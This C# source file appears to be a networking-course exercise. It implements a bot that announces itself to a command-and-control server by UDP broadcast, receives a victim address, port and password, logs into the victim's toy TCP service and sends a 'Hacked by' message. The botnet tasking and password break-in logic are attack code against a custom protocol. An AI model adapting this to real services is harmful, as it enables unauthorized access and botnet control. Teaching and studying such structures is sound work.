using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace bot
{

    class BotServer
    {
        private readonly string _newline_delimeter = "\r\n";
        private Thread _broadcast_thread;
        private String _hacked_message = "Hacked by ";
        private int _listening_port;
        private int _sending_port;
        private int _cc_port;
        private string _brodcast = "255.255.255.255";
        private static object _sync_lock = new object();
        private static object _port_lock = new object();

        public BotServer(int cc_port)
        {

            lock (_port_lock) {
                _listening_port = find_free_port();
                _sending_port = find_free_port();
                _cc_port = cc_port;

            }

        }

        public int find_free_port()
        {
            UdpClient client_for_port = new UdpClient(0);
            int port = ((IPEndPoint)client_for_port.Client.LocalEndPoint).Port;
            client_for_port.Close();
            return port;

        }

        public void start()
        {
            _broadcast_thread = new Thread(new ThreadStart(activate_timer));
            _broadcast_thread.Start();
            listening_to_bot();
            int t = Console.Read();
        }
        
        public void activate_timer()
        {
            //timer - bot announcement
            int sec = 1000;
            int num_of_sec = 10;
            System.Timers.Timer timer = new System.Timers.Timer(sec * num_of_sec);
            timer.Elapsed += bot_announcement;
            timer.Enabled = true;
        }

        public void bot_announcement(Object source, System.Timers.ElapsedEventArgs e)
        {
            lock (_sync_lock)
            {
                UdpClient client_udp = new UdpClient();
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, _sending_port);
                byte[] bytes = BitConverter.GetBytes((UInt16)_listening_port);
                client_udp.Client.Bind(ip);
                client_udp.Send(bytes, bytes.Length, _brodcast, _cc_port);
                client_udp.Close();
            }
        }

        public void listening_to_bot()
        {
            bool done = false;
            try
            {
                while (!done)
                {
                    UdpClient client = new UdpClient(_listening_port);
                    IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
                    byte[] bytes = client.Receive(ref sender);
                    client.Close();
                    Byte[] victim_ip_b = new Byte[4];
                    Array.Copy(bytes, 0, victim_ip_b, 0, 4);
                    Byte[] victim_port_b = new Byte[2];
                    Array.Copy(bytes, 4, victim_port_b, 0, 2);
                    Byte[] victim_pass_b = new Byte[6];
                    Array.Copy(bytes, 6, victim_pass_b, 0, 6);
                    Byte[] cnn_name_b = new Byte[32];
                    Array.Copy(bytes, 12, cnn_name_b, 0, 32);
                    try
                    {
                        String victim_ip = (new IPAddress(victim_ip_b)).ToString();
                        int victim_port = BitConverter.ToUInt16(victim_port_b, 0);
                        String victim_pass = Encoding.ASCII.GetString(victim_pass_b, 0, victim_pass_b.Length);
                        String cnn_name = Encoding.ASCII.GetString(cnn_name_b, 0, cnn_name_b.Length);
                        Thread attack_t = new Thread(() =>attack(victim_ip, victim_port, victim_pass, cnn_name));
                        attack_t.Start();

                    }
                    catch (Exception e)
                    {

                    }
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("there was an error reciving port: " +_listening_port + " sending port :" +_sending_port );
            }
            finally
            {
             //   listener.Close();
            }
        
    }

        private bool reached_message_end(byte[] rcv_buffer, int offset, int readBytes)
        {
            if (offset < readBytes - 1 && offset < rcv_buffer.Length - 1)
            {
                byte[] maybe_delimeter = { rcv_buffer[offset], rcv_buffer[offset + 1] };
                return Encoding.ASCII.GetString(maybe_delimeter).Equals(_newline_delimeter);
            }
            else
            {
                return false;
            }
        }

        private string receive(Socket client,int msg_size)
        {
            string ans = "";
            byte[] rcv_buffer = new byte[msg_size];
            int offset = 0;
            int readBytes = client.Receive(rcv_buffer, msg_size, SocketFlags.None);
            while (!reached_message_end(rcv_buffer, offset, readBytes))
            {
                byte[] tmp = { rcv_buffer[offset] };
                ans += Encoding.ASCII.GetString(tmp);
                offset++;
            }
            if (offset == 0)
            {
                //handleNoResponse(client);
            }
            return ans;
        }

        public void attack(string ip, int port, string pass, String cnn_name)
        {
            if (port > -1) {
                IPAddress victimAddress = IPAddress.Parse(ip);
                IPEndPoint ipep = new IPEndPoint(victimAddress, port);
                Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                try {
                    server.Connect(ipep);
                    //Socket server = socket.Accept();
                    string response = receive(server, 100);
                    // check if the input is ok
                    if (String.Equals(response, "Please enter your password", StringComparison.OrdinalIgnoreCase)) {
                        byte[] buffer = Encoding.ASCII.GetBytes(pass + _newline_delimeter);
                        server.Send(buffer, pass.Length + _newline_delimeter.Length, SocketFlags.None);
                        try
                        {
                            response = receive(server, 100);
                            if (String.Equals(response, "Access granted", StringComparison.OrdinalIgnoreCase))
                            {
                                String send_mssg = _hacked_message + cnn_name + _newline_delimeter;
                                buffer = Encoding.ASCII.GetBytes(send_mssg);
                                server.Send(buffer, send_mssg.Length, SocketFlags.None);
                            }
                        }
                        catch (Exception e) { }
                    }
                    
                }
                catch(Exception e) { }
            
        }

    }
}
    }
